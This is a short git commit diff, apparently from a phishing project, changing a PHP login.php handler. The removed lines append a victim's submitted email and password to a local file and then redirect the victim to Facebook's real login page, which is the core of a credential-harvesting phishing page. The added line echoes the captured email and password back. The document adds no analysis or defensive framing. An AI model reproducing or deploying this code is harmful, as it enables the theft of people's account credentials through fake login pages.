421b5cc91df0a20309f3021e5d9cdb092ae3b7db
lkfb <lkfb@hushmail.com>
2017-05-13 23:11:10 +0000

    php
    php

--- login.php
+++ login.php
@@ -1,8 +1,5 @@
 <?php
 $email=$_POST['email'];
 $pass = $_POST['pass'];
-$f = fopen("abd", "a+");
-fwrite($f, "\n"+$email+" : "+$pass+"\n");
-fclose($f);
-header("Location: https://www.facebook.com/login.php");
+echo $email." : ".$pass;
 ?>
